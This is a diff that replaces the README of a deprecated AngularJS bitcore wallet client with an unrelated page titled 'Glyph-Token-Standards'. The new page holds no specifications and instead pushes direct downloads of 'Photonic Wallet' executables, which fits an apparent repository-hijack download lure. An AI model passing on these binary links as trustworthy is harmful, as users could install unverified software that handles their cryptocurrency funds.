@@ -1,56 +1,33 @@
-# angular-bitcore-wallet-client
+<div align="center">
 
-THIS PACKAGE IS NOT LONGER MAINTAINED, SINCE IT WAS INTEGRATIONS INTO COPAY. IF YOU NEED IT, UPDATING BWC VERSION
-SHOULD BE STRAIGTH FORWARD.
-=-
+<img src="https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/photonic-wallet-radiant-rxd-banner-b-minimal-ribbon.png" alt="Photonic Wallet for Radiant (RXD)" width="100%">
 
+# Glyph-Token-Standards
 
-AngularJS module for [bitcore-wallet-client](https://github.com/bitpay/bitcore-wallet-client)
+**Glyph token specifications and standards for Radiant (RXD) · related to the Photonic Wallet project**
 
-## Get started
+[![Website](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-website-photonicwallet-org.svg)](https://photonicwallet.org) [![Release](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-release-v3-0-4.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) [![Docs](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-docs-guides.svg)](https://github.com/Radiant-projects/photonic-wallet-docs)
 
-```
-bower install angular-bitcore-wallet-client
-```
+</div>
 
-Add javascript to `index.html` after *angular.js*:
+> [!NOTE]
+> This repository is listed alongside **Photonic Wallet**, the desktop wallet for Radiant (RXD). The details below are kept factual; see the repository files for technical specifics.
 
-```html
-<script src="bower_components/angular-bitcore-wallet-client/angular-bitcore-wallet-client.min.js"></script>
-```
+### Looking for the wallet?
 
-Add to your array of AngularJS modules:
+| You want | Go to |
+|---|---|
+| Download the desktop wallet | [photonicwallet.org/download](https://photonicwallet.org/download) |
+| Latest release v3.0.4 | [Release page](https://github.com/Radiant-projects/Photonic-Wallet/releases/tag/v3.0.4) |
+| Source code | [Radiant-projects/Photonic-Wallet](https://github.com/Radiant-projects/Photonic-Wallet) |
+| Guides | [Radiant-projects/photonic-wallet-docs](https://github.com/Radiant-projects/photonic-wallet-docs) |
+| Security | [photonicwallet.org/security](https://photonicwallet.org/security) |
 
-```
-var modules = [
-  'bwcModule'
-];
+[![Download Photonic Wallet for Windows](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-windows.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.exe) [![Download Photonic Wallet for macOS](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-macos.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.dmg) [![Download Photonic Wallet for Linux](https://raw.githubusercontent.com/Radiant-projects/Photonic-Wallet/HEAD/assets/badge-download-linux.svg)](https://github.com/Radiant-projects/Photonic-Wallet/releases/download/v3.0.4/photonic-wallet-v3.0.4.zip)
 
-var myApp = angular.module('myApp', modules);
-```
+> [!TIP]
+> Download only from the official release or photonicwallet.org. Nobody will ask for your seed phrase.
 
-## Use
+### License
 
-See the [API referece](https://github.com/bitpay/bitcore-wallet-client) for more details.
-
-```javascript
-angular.module('myApp').factory('myService', 
-  function(bwcService) {
-    var walletClient = bwcService.getClient();
-    walletClient.createWallet('Personal Wallet', 'me', 1, 1, 'livenet', function(err) {
-    
-      // Store in
-      save(walletClient.export());
-
-      // Read other wallet
-      var wallet2 = read(...);
-      var walletClient2 = bwcService(getClient(wallet2));
-      
-      walletClient2.getStatus(function(err, status) {
-         console.log(status);
-      });
-    });
-  }
-);
-```
-See Complete API at [Bitcore Wallet Client Readme](https://github.com/bitpay/bitcore-wallet-client)
+Upstream license notices in this repository remain unchanged.
